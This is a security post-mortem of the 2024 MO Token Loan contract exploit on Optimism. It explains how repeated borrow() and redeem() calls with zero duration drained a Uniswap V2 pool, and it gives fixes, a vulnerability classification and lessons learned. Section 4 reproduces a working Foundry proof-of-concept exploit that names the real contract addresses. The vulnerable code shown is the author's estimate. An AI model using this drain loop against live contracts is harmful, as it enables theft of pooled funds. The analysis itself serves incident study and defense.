# MO Token — Business Logic Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2024-03-14 |
| **Protocol** | MO Token (Loan contract) |
| **Chain** | Optimism |
| **Loss** | ~$750,000 (attacker profit ~$413K USD+) |
| **Attacker** | [Unknown](https://optimistic.etherscan.io/address/) — not specified in PoC |
| **Attack Tx** | [0x4ec306...7417](https://optimistic.etherscan.io/tx/0x4ec3061724ca9f0b8d400866dd83b92647ad8c943a1c0ae9ae6c9bd1ef789417) |
| **Vulnerable Contract (Loan)** | [0xAe7b65...838E](https://optimistic.etherscan.io/address/0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E) |
| **MO Token** | [0x61445C...AA1](https://optimistic.etherscan.io/address/0x61445Ca401051c86848ea6b1fAd79c5527116AA1) |
| **LP Pair (UniV2)** | [0x4a6E0f...991](https://optimistic.etherscan.io/address/0x4a6E0fAd381d992f9eB9C037c8F78d788A9e8991) |
| **Root Cause** | Business logic flaw enabling unlimited MO token withdrawal from the LP pool via repeated `borrow()` + `redeem()` calls |
| **PoC Source** | [DeFiHackLabs — MO_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/MO_exp.sol) |

---

## 1. Vulnerability Overview

The `Loan` contract of the MO Token protocol allows users to provide MO tokens as collateral, execute loans via the `borrow()` function, and repay collateral via the `redeem()` function.

The core vulnerability is a **state update logic flaw in `borrow()` and `redeem()`**. The attacker was able to mass-withdraw MO tokens from the Uniswap V2 LP pool without authorization by repeatedly calling `borrow()` with the same collateral (MO tokens), then repaying each loan order with `redeem()`.

Specifically:
1. The attacker acquires a small amount of MO tokens (62,147,724 units).
2. Using the same balance, `borrow(mo_balance, 0)` is called 80 times in a loop, creating a new loan order on each call.
3. Within each iteration, `redeem(i)` is called immediately to reclaim the collateral.
4. During this process, the LP pool's MO token balance is progressively drained.
5. Finally, the attacker calls `borrow()` for the entire remaining MO balance in the LP pool (`MO.balanceOf(UniV2Pair) - 1`).
6. The acquired MO tokens are swapped for USDT via the Uniswap V2 router to realize profit.

This vulnerability requires no flash loan and is exploitable with only a small amount of MO tokens, making it highly severe given its ability to fully drain the LP pool.

---

## 2. Vulnerable Code Analysis

### 2.1 Loan.borrow() — Allows Repeated Borrowing Without Collateral Lock (Core Vulnerability)

**Vulnerable code (estimated)**:
```solidity
// ❌ Vulnerable code — withdraws MO from LP but lacks sufficient state validation
function borrow(uint256 amount, uint256 duration) external {
    // Does not block duration=0 — allows immediate redeem
    require(amount > 0, "amount must > 0");

    // Transfers user's actual MO balance via approve_proxy
    // ❌ Issue: same caller can call with same amount any number of times
    // ❌ Issue: no cumulative validation on MO withdrawn from LP pool
    IERC20(MO).transferFrom(msg.sender, address(this), amount);

    // Creates loan order — each call assigns a new order index
    uint256 index = borrowOrders[msg.sender].length;
    borrowOrders[msg.sender].push(BorrowOrder({
        amount: amount,
        duration: duration,
        timestamp: block.timestamp
    }));

    // Pays out USDT/MO from LP pool to attacker as collateral value
    // ❌ Issue: no logic limiting MO outflow from LP
    UniV2Pair.transfer(msg.sender, calculateBorrowAmount(amount));

    emit Borrow(msg.sender, index, amount, duration);
}
```

**Fixed code**:
```solidity
// ✅ Fixed code — prevents repeated borrowing + validates LP withdrawal limits
mapping(address => uint256) public activeBorrowAmount; // tracks active loan balance

function borrow(uint256 amount, uint256 duration) external {
    require(amount > 0, "amount must > 0");
    require(duration > 0, "duration must > 0"); // ✅ blocks immediate repayment (duration=0)

    // ✅ Prevents exceeding user's active borrow limit
    uint256 maxBorrow = calculateMaxBorrow(msg.sender);
    require(activeBorrowAmount[msg.sender] + amount <= maxBorrow, "exceeds borrow limit");

    // ✅ Cumulatively tracks active loan amount
    activeBorrowAmount[msg.sender] += amount;

    IERC20(MO).transferFrom(msg.sender, address(this), amount);

    uint256 index = borrowOrders[msg.sender].length;
    borrowOrders[msg.sender].push(BorrowOrder({
        amount: amount,
        duration: duration,
        timestamp: block.timestamp
    }));

    UniV2Pair.transfer(msg.sender, calculateBorrowAmount(amount));
    emit Borrow(msg.sender, index, amount, duration);
}
```

**Issue**: The `borrow()` function does not restrict repeated calls from the same user and permits duration=0 (immediate repayment). Since a new order index is created on every call, the attacker can reuse the same collateral to create multiple orders and immediately redeem each one. This causes the LP pool's MO balance to be repeatedly drained with each cycle.

---

### 2.2 Loan.redeem() — Allows Collateral Reuse After Return

**Vulnerable code (estimated)**:
```solidity
// ❌ Vulnerable code — immediately returns collateral MO to attacker after repayment
function redeem(uint256 index) external {
    BorrowOrder storage order = borrowOrders[msg.sender][index];
    require(order.amount > 0, "order not found");

    // ❌ Issue: duration=0 allows immediate repayment
    // require(block.timestamp >= order.timestamp + order.duration, "not yet");

    uint256 amount = order.amount;
    order.amount = 0; // reset order

    // ❌ Active loan amount not decremented (or incorrectly tracked)
    // Returns MO tokens to attacker → attacker can call borrow() again
    IERC20(MO).transfer(msg.sender, amount);

    emit Redeem(msg.sender, index, amount);
}
```

**Fixed code**:
```solidity
// ✅ Fixed code — enforces minimum loan duration + decrements active balance
function redeem(uint256 index) external {
    BorrowOrder storage order = borrowOrders[msg.sender][index];
    require(order.amount > 0, "order not found or already redeemed");

    // ✅ Checks that minimum loan period has elapsed (duration=0 blocked at borrow level)
    require(
        block.timestamp >= order.timestamp + order.duration,
        "borrow period not elapsed"
    );

    uint256 amount = order.amount;
    order.amount = 0;

    // ✅ Decrements active loan amount — ensures future borrow limits are calculated correctly
    activeBorrowAmount[msg.sender] -= amount;

    IERC20(MO).transfer(msg.sender, amount);
    emit Redeem(msg.sender, index, amount);
}
```

**Issue**: Once `redeem()` returns the collateral MO to the attacker, the attacker can immediately call `borrow()` again with the same tokens in the next loop iteration. The `borrow()`/`redeem()` combination effectively acts as a pump that infinitely extracts MO from the LP pool.

---

### 2.3 LP Pool Drain via borrow() + redeem() Repeat Loop

**Core attack pattern**:
```solidity
// ❌ Vulnerable pattern: borrow→redeem repeated with same mo_balance
// Each cycle extracts MO from the LP pool while the attacker reuses the same collateral
function do_some_borrow(uint256 i) public {
    LOAN.borrow(mo_balance, 0);  // withdraws MO from LP (creates i-th order)
    LOAN.redeem(i);              // returns collateral MO → reusable in next loop
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

| Item | Details |
|------|------|
| Initial Funds | 62,147,724 units of MO tokens (small amount) |
| Flash Loan | Not used |
| Pre-approval | Unlimited MO/USDT approval granted to `approve_proxy` |
| Helper Contract | `Money` contract deployed (for approval delegation) |

### 3.2 Execution Phase

1. **[Setup]** Fork Optimism at block 117,395,511
2. **[Acquire MO]** Obtain 62,147,724 MO via `deal()` (test environment; acquired separately in the actual attack)
3. **[Deploy Helper]** Deploy `Money` contract and delegate approve to attacker address
4. **[Begin Loop]** Repeat up to 80 times starting from `i = 0`:
   - `LOAN.borrow(mo_balance, 0)`: request loan with full MO balance → withdraw MO from LP pool
   - `LOAN.redeem(i)`: immediately repay the just-created order → reclaim MO collateral
   - Re-borrow with same MO in next iteration
5. **[Final Withdrawal]** `LOAN.borrow(MO.balanceOf(UniV2Pair) - 1, 0)`: drain all remaining MO from LP
6. **[Swap]** `Router.swapExactTokensForTokens()`: swap acquired MO for USDT
7. **[Profit]** Profit realized in USDT

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                     Attacker (EOA)                               │
│                Holds 62,147,724 units of MO tokens               │
└────────────────────────┬────────────────────────────────────────┘
                         │ approve(approve_proxy, max)
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                    approve_proxy contract                         │
│            (MO and USDT transfer delegation hub)                 │
└─────────────────────────────────────────────────────────────────┘

         ┌──────────────────── Repeat Loop (up to 80x) ───────────────────────┐
         │                                                                    │
         │  ┌──────────────────────┐       ┌────────────────────────────┐    │
         │  │   Attacker Contract  │──────▶│   Loan Contract            │    │
         │  │                      │       │                            │    │
         │  │  do_some_borrow(i):  │       │  borrow(mo_balance, 0):   │    │
         │  │  1. call borrow()    │       │  • create order index=i    │    │
         │  │  2. call redeem(i)   │◀──────│  • withdraw MO from LP     │    │
         │  └──────────────────────┘       └──────────┬─────────────────┘    │
         │           │  ▲                             │                       │
         │           │  │ collateral MO returned      │ MO withdrawn         │
         │           │  │ (redeem complete)            ▼                       │
         │           │  │                  ┌──────────────────────┐           │
         │           │  └──────────────────│  Uniswap V2 LP Pool  │           │
         │           │  borrow()→redeem()  │  (MO/USDT pair)      │           │
         │           │  repeat → LP drain  │  MO balance ↓ drops  │           │
         │           └─────────────────────└──────────────────────┘           │
         │                                                                    │
         └────────────────────────────────────────────────────────────────────┘

                    ┌──────────────────────────────────────────┐
                    │       After loop: final borrow            │
                    │  LOAN.borrow(LP balance - 1, 0)          │
                    │  → drain all remaining MO from LP pool    │
                    └────────────────────┬─────────────────────┘
                                         │
                                         ▼
                    ┌──────────────────────────────────────────┐
                    │       Uniswap V2 Router                  │
                    │  swapExactTokensForTokens(MO → USDT)    │
                    └────────────────────┬─────────────────────┘
                                         │
                                         ▼
                    ┌──────────────────────────────────────────┐
                    │           Attacker Wallet                 │
                    │       USDT received (profit realized)     │
                    │       ~$413K ~ $750K USD                 │
                    └──────────────────────────────────────────┘
```

### 3.4 Outcome

| Item | Details |
|------|------|
| Attacker Profit | ~$413K USD+ (final USDT balance) |
| Protocol Loss | ~$750,000 (full LP pool MO token drain) |
| Flash Loan Used | No |
| Blocks to Execute | Single transaction (1 block) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Step 1] Contract and interface definitions
interface Loan {
    function borrow(uint256 amount, uint256 duration) external; // execute loan
    function redeem(uint256 index) external;                    // repay loan + return collateral
    function borrowOrdersCount(address account) external view returns (uint256);
}

contract contractTest is Test {
    IERC20 constant MO   = IERC20(0x61445Ca401051c86848ea6b1fAd79c5527116AA1); // MO token
    IERC20 constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58); // USDT
    Loan   constant LOAN = Loan(0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E);   // vulnerable contract
    address constant approve_proxy = 0x9D8355a8D721E5c79589ac0aB49BC6d3e0eF7C3F;
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x9eADD135641f8b8cC4E060D33d63F8245f42bE59);
    Uni_Pair_V2 UniV2Pair = Uni_Pair_V2(0x4a6E0fAd381d992f9eB9C037c8F78d788A9e8991); // MO/USDT LP
    uint256 mo_balance;

    function setUp() public {
        // [Step 2] Fork Optimism at block 117,395,511 (state just before attack)
        cheats.createSelectFork("optimism", 117_395_511);
    }

    function testExploit() external {
        // [Step 3] Log initial balances
        emit log_named_decimal_uint("[Begin] Attacker USDT", USDT.balanceOf(address(this)), 6);

        // [Step 4] Acquire small amount of MO tokens (purchased separately in actual attack)
        deal(address(MO), address(this), 62_147_724);

        // [Step 5] Deploy helper contract (for approval delegation)
        Money bind_contract = new Money();
        bind_contract.approve(address(this));

        // [Step 6] Grant unlimited approval to approve_proxy (Loan contract transfers via approve_proxy)
        MO.approve(address(approve_proxy), type(uint256).max);
        USDT.approve(address(approve_proxy), type(uint256).max);

        // [Step 7] Store current MO balance
        mo_balance = MO.balanceOf(address(this));

        // [Step 8] borrow + redeem repeat loop — progressively drain LP pool MO
        uint256 i = 0;
        while (i < 80) {
            try this.do_some_borrow(i) {}
            catch { break; } // auto-exit when LP is drained
            i++;
        }

        // [Step 9] Final withdrawal of all remaining MO from LP
        LOAN.borrow(MO.balanceOf(address(UniV2Pair)) - 1, 0);

        // [Step 10] Swap withdrawn MO for USDT
        MO.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(MO);
        path[1] = address(USDT);
        MO.transfer(address(Router), 10); // pre-transfer minimum amount (swap initialization)
        Router.swapExactTokensForTokens(3, 0, path, address(this), block.timestamp + 100);

        // [Step 11] Check final USDT balance
        emit log_named_decimal_uint("[End] Attacker USDT", USDT.balanceOf(address(this)), 6);
    }

    // [Core attack function] borrow → redeem repeated with same collateral
    function do_some_borrow(uint256 i) public {
        LOAN.borrow(mo_balance, 0); // ← vulnerability: duration=0, same balance reused
        LOAN.redeem(i);             // ← immediate repayment and collateral recovery
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | `borrow()` lacks repeat call restriction — allows same collateral reuse | CRITICAL | CWE-840 (Business Logic Errors) | `11_logic_error.md` |
| V-02 | `duration=0` permitted — collateral recycled via immediate repayment | HIGH | CWE-284 (Improper Access Control) | `11_logic_error.md` |
| V-03 | No cumulative withdrawal cap on LP pool outflow | HIGH | CWE-770 (Allocation Without Limits) | `16_accounting_sync.md` |
| V-04 | No active loan balance tracking — accounting inconsistency | MEDIUM | CWE-682 (Incorrect Calculation) | `16_accounting_sync.md` |

### V-01: borrow() Repeat Call Restriction Missing (Core)

- **Description**: The `borrow()` function does not restrict repeated calls from the same user by count or balance, allowing the attacker to execute 80+ loans with a small amount of MO.
- **Impact**: Full drain of MO tokens from the LP pool. ~$750,000 USDT liquidity loss.
- **Attack Conditions**: Requires only a small MO token balance + approve_proxy approval. No flash loan needed.

### V-02: duration=0 Immediate Repayment Permitted

- **Description**: The `duration` parameter in `borrow()` is not rejected when set to 0, allowing the attacker to immediately reclaim collateral via `redeem()` right after borrowing.
- **Impact**: The `borrow()` → `redeem()` loop can repeat indefinitely within the same transaction.
- **Attack Conditions**: Ability to call `borrow()` with `duration=0`.

### V-03: No Cumulative Withdrawal Cap on LP Pool

- **Description**: The protocol has no logic to track or limit the total amount of MO tokens flowing out of the LP pool.
- **Impact**: The LP pool can be fully drained within a single transaction.
- **Attack Conditions**: Repeated `borrow()` calls until LP balance reaches 0.

### V-04: Active Loan Balance Not Tracked

- **Description**: No state variable tracks each user's total active loan amount, so the protocol cannot determine the attacker's actual debt exposure.
- **Impact**: The protocol's accounting state diverges from the actual LP balance, potentially enabling additional attack vectors.
- **Attack Conditions**: New loans are always permitted without active loan tracking.

---

## 6. Remediation Recommendations

### Immediate Actions

**1. Block duration=0**
```solidity
// ✅ Prevent immediate repayment at borrow() entry
function borrow(uint256 amount, uint256 duration) external {
    require(duration >= MIN_BORROW_DURATION, "duration too short"); // enforce minimum 1 hour
    // ...
}
```

**2. Enforce per-user active borrow limit**
```solidity
// ✅ Prevent borrowing beyond user's MO holdings
mapping(address => uint256) public activeBorrowTotal;

function borrow(uint256 amount, uint256 duration) external {
    uint256 userBalance = IERC20(MO).balanceOf(msg.sender);
    require(activeBorrowTotal[msg.sender] + amount <= userBalance, "exceeds collateral");
    activeBorrowTotal[msg.sender] += amount;
    // ...
}

function redeem(uint256 index) external {
    // ...
    activeBorrowTotal[msg.sender] -= order.amount;
    // ...
}
```

**3. Set daily LP pool withdrawal limit**
```solidity
// ✅ Cap single-transaction LP pool withdrawal
uint256 public constant MAX_BORROW_PER_TX = lpPool.totalReserve() * 10 / 100; // 10%

function borrow(uint256 amount, uint256 duration) external {
    require(amount <= MAX_BORROW_PER_TX, "single borrow too large");
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Repeated borrowing allowed | Cap concurrent active orders per user (e.g., max 1–3) |
| duration=0 permitted | Enforce minimum loan duration parameter (`MIN_DURATION` constant) |
| Unlimited LP withdrawal | Prohibit single loan exceeding a fixed percentage of LP pool MO balance |
| Accounting inconsistency | Introduce real-time `totalActiveBorrowed` state variable |
| Reentrancy risk | Add `nonReentrant` modifier (additional protection layer) |
| No monitoring | Introduce alerting system for large borrows (e.g., Chainlink Automation) |

---

## 7. Lessons Learned

1. **Business logic vulnerabilities are not syntax errors**: `borrow()` and `redeem()` each function correctly in isolation, but combining them creates a critical flaw. Unit tests alone are insufficient to detect this; integrated scenario testing and economic attack simulations are required.

2. **Always examine edge cases like `duration=0`**: Define explicit behavior for parameters set to 0 or extreme values, and constrain their permitted range.

3. **Track state changes within a single transaction**: Verify whether cumulative effects arise when the same function is called repeatedly within one transaction. Extra caution is warranted when accessing shared resources such as LP pools.

4. **Large-scale attacks are possible with minimal initial capital**: This attack extracted $750K+ with no flash loan and only a small MO token position. Patterns with low entry cost and high return rapidly attract attackers.

5. **Limiting LP pool exposure is the key defense**: If a lending protocol directly accesses an AMM LP pool, single-borrow and daily borrow limits expressed as a fraction of LP balance must be enforced.

6. **The same DeFi vulnerabilities apply on L2 networks like Optimism**: L2 does not automatically improve security. Business logic vulnerabilities exist regardless of the underlying chain.

7. **Adopt invariant testing**: Writing invariants such as "the LP pool's MO balance cannot decrease by more than N% in a single transaction" using Foundry's `invariant test` can detect these attacks before deployment.

---

## 8. On-Chain Verification

### 8.1 Verification Status

Automated on-chain verification via `cast` was not performed. The values below are estimates derived from PoC code analysis.

### 8.2 PoC Key Parameters Summary

| Item | PoC Value | Notes |
|------|--------|------|
| Fork Block | 117,395,511 | State just before attack |
| Initial MO Balance | 62,147,724 (wei units) | Acquired via `deal()` |
| Iterations | Up to 80 | Break on LP drain |
| Final Borrow | `LP balance - 1` | Full LP pool drain |
| Attack Tx | [0x4ec306...7417](https://optimistic.etherscan.io/tx/0x4ec3061724ca9f0b8d400866dd83b92647ad8c943a1c0ae9ae6c9bd1ef789417) | Optimism |

### 8.3 Related Contract Addresses (Optimism)

| Contract | Address | Link |
|----------|------|------|
| MO Token | `0x61445Ca401051c86848ea6b1fAd79c5527116AA1` | [Etherscan](https://optimistic.etherscan.io/address/0x61445Ca401051c86848ea6b1fAd79c5527116AA1) |
| Loan Contract | `0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E` | [Etherscan](https://optimistic.etherscan.io/address/0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E) |
| Approve Proxy | `0x9D8355a8D721E5c79589ac0aB49BC6d3e0eF7C3F` | [Etherscan](https://optimistic.etherscan.io/address/0x9D8355a8D721E5c79589ac0aB49BC6d3e0eF7C3F) |
| Uniswap V2 Router | `0x9eADD135641f8b8cC4E060D33d63F8245f42bE59` | [Etherscan](https://optimistic.etherscan.io/address/0x9eADD135641f8b8cC4E060D33d63F8245f42bE59) |
| MO/USDT LP Pool | `0x4a6E0fAd381d992f9eB9C037c8F78d788A9e8991` | [Etherscan](https://optimistic.etherscan.io/address/0x4a6E0fAd381d992f9eB9C037c8F78d788A9e8991) |
| USDT (Optimism) | `0x94b008aA00579c1307B0EF2c499aD98a8ce58e58` | [Etherscan](https://optimistic.etherscan.io/address/0x94b008aA00579c1307B0EF2c499aD98a8ce58e58) |

---

*Analysis date: 2026-04-11 | Analysis basis: DeFiHackLabs PoC (MO_exp.sol)*